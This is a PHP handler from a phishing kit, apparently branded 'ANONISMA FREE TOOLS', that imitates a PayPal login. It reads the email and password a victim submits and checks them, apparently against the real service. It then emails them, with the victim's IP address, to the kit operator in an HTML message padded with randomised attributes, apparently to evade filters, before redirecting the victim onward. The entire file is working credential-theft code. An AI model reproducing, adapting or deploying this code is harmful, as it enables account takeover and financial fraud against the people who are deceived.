<?php
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/bots.php');
	include('./info.php');
//---------------------------------------------------------------------------------------- VAR
	$tkhrbi9 = Rand_bill().md5(gmdate('r'));
	$ip = getenv("REMOTE_ADDR");
//---------------------------------------------------------------------------------------- VRF
	if (isset($_POST['EM']) || isset($_POST['PS'])) {
	$cn = $_POST['CN'];
	$em = urlencode($_POST['EM']);
	$ps = urlencode($_POST['PS']);
	$_SESSION['EM'] = $_POST['EM'];
	$_SESSION['PS'] = $_POST['PS'];
	$x = (empty($cn)) ? '' : '&country=';
//---------------------------------------------------------------------------------------- TRU
	if(!Anon_true($em, $ps, $_SERVER['HTTP_USER_AGENT'])){
	die(Hna_lhih(Jib_milaf()."login-error=false", '', $x.$cn));
	}else{
	$cartamensaje = "<!DOCTYPE html><html> <head> 
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> 
    <meta name=\"viewport\" content=\"width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;\"> 
    <style type=\"text/css\">body { width: 100% !important;}</style> 
	</head> 
	  <body class=\" ".Y()." \"  id=\"".X()."\"   style=\"PADDING-BOTTOM: 0px; PADDING-TOP: 40px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #e9e9e9\"> 
		<table class=\" ".Y()." \" style=\"WIDTH: 100%\"> 
		  <tbody class=\" ".Y()." \"  for=\"".Y()."\"> 
			<tr class=\" ".Y()." \"> 
			  <td  for=\" ".Y()." \"  style=\" BACKGROUND-COLOR: #e9e9e9\" align=\"center\"> 
				<table class=\" ".Y()." \" width=\"600\" border=\"0\"> 
				  <tbody class=\" ".Y()." \"> 
					<tr> 
					  <td class=\" ".Y()." \"> 
						<div class=\" ".Y()." \"> 
						  <table class=\" ".Y()." \" for=\" ".Y()." \"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
							<tbody  for=\"".Y()."\"  > 
							  <tr class=\" ".Y()." \"> 
								<td class=\" ".Y()." \"  for=\"".Y()."\"    style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius: 10px 10px 0px 0px\"> 
								  <table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
									<tbody> 
									  <tr> 
										<td class=\" ".Y()." \"> 
										  <div class=\" ".Y()." \" id=\"".X()."\"  align=\"center\" style=\"LINE-HEIGHT: 30px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
											<p> 
											<div class=\" ".Y()." \"  for=\" ".Y()." \"   style=\"FONT-SIZE: 10px; FONT-FAMILY: Arial black; COLOR: #828282;\" > 
											  <p style=\"FONT-SIZE: 27px\"><strong><font color=\"#7E7E7E\"> \ ◇ ◇ ◇  <font size=\"6\">☠</font> MA DZ TN <font size=\"6\">☠</font>  ◇ ◇ ◇  / </font></strong> 
											  </p> 
											</div> 
											</p> 
										  </div> 
										</td> 
									  </tr> 
									</tbody> 
								  </table> 
								</td> 
							  </tr> 
							</tbody> 
						  </table> 
						</div> 
						<div> 
						<table class=\" ".Y()." \"  id=\"".X()."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
						  <tbody class=\" ".Y()." \"> 
							<tr> 
							  <td class=\" ".Y()." \" style=\" BACKGROUND: #F5F5F5 ; LINE-HEIGHT: 22px;border-top:2px solid #7E7E7E\"> 
								<table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
								  <tbody> 
									<tr> 
									  <td> 
										<div class=\" ".Y()." \"  for=\" ".Y()." \"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
										<b><font color=\"#7E7E7E\">★ PAYPAL LOGIN ACCOUNT ★</font></b> 
									  </td> 
									</tr> 
									<tr class=\" ".Y()." \" for=\"".Y()."\"   style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td> 
										<div  id=\"".X()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										 " .$_POST['EM']." 
										</div> 
										<div class=\" ".Y()." \" for=\" ".Y()." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 5px 0px 4px 0px\">						   
										 " .$_POST['PS']." 
										</div> 
									  </td> 
									</tr> 
									<tr class=\" ".Y()." \"  for=\"".Y()."\"   style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
									  <td> 
										<div  id=\"".X()."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
										  " .$cn." 
										</div> 
									  </td> 
									</tr>  					   
								  </tbody> 
								</table> 
							  </td> 
							</tr> 
						  </tbody> 
						</table> 
						</div> 
						<div> 
						  <table class=\" ".Y()." \"  id=\"".X()."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
							<tbody class=\" ".Y()." \"> 
							  <tr> 
								<td class=\" ".Y()." \" for=\"".Y()."\"   style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 27px\"> 
								  <table  for=\"".Y()."\"   width=\"600\" align=\"left\" border=\"0\"> 
									<tbody class=\" ".Y()." \"> 
									  <tr> 
										<!-- -->							   
									  </tr> 
									</tbody> 
								  </table> 
								</td> 
							  </tr> 
							</tbody> 
						  </table> 
						</div> 
						<div class=\" ".Y()." \"> 
						<table class=\" ".Y()." \"  id=\"".X()."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
						  <tbody> 
							<tr> 
							  <td class=\" ".Y()." \" for=\"".Y()."\"    style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius:0px 0px 10px 10px\"> 
								<table class=\" ".Y()." \" cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
								  <tbody> 
									<tr class=\" ".Y()." \"> 
									  <td> 
										<div class=\" ".Y()." \"  for=\"".Y()."\"   style=\"FONT-SIZE: 9px; FONT-FAMILY: Arial; COLOR: #747474;margin-left:30px;margin-right:30px\"> 
										  <hr size=\"2\" color=\"#F0F0F0\" width=\"100%\"> 
										  <p align=\"center\" > 
											---- | ★ ★ ★ ANONISMA FREE TOOLS ★ ★ ★ | ---- 
										  </p> 
									  </td> 
									</tr> 
								  </tbody> 
								</table> 
							  </td> 
							</tr> 
						  </tbody> 
						</table> 
						</div> 
					  </td> 
					</tr> 
					<tr class=\" ".Y()." \"> 
					  <td class=\" ".Y()." \"  for=\"".Y()."\"   style=\" PADDING-TOP: 10px; \" align=\"center\"> 
						<div class=\" ".Y()." \" align=\"center\" style=\"FONT-SIZE: 11px; FONT-FAMILY: Arial; COLOR: #959595;\"> 
						  <p> 
							بعيدا عن السبام 
							<br> 
							سهر + برمجة + سكريبتات + الشبكات + تواضع = صرف و إحترام 
							<br> 
							تدوين + تقنية + ربح + بلوكر= شاعر معلوماتي عباد االأسهم  
							<br> 
							الجديد إصنعه بيدك لنغير سلوكنا 
						  </p> 
						</div> 
					  </td> 
					</tr> 
				  </tbody> 
				</table> 
			  </td> 
			</tr> 
		  </tbody> 
		</table> 
	  </body> 
	</html>";
	$subject = "L0G / $ip ";
	$headers = "From: Muh Fucka <Anonisma-Free-Tools@hotmail.com>\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
	mail($enviardatos,$subject,$cartamensaje,$headers);							 
	die(Hna_lhih("account.php?", $tkhrbi9, $x.$cn));
	}
	}else{
	die(Hna_lhih('index.php'));
	}
//---------------------------------------------------------------------------------------- FIN


?>
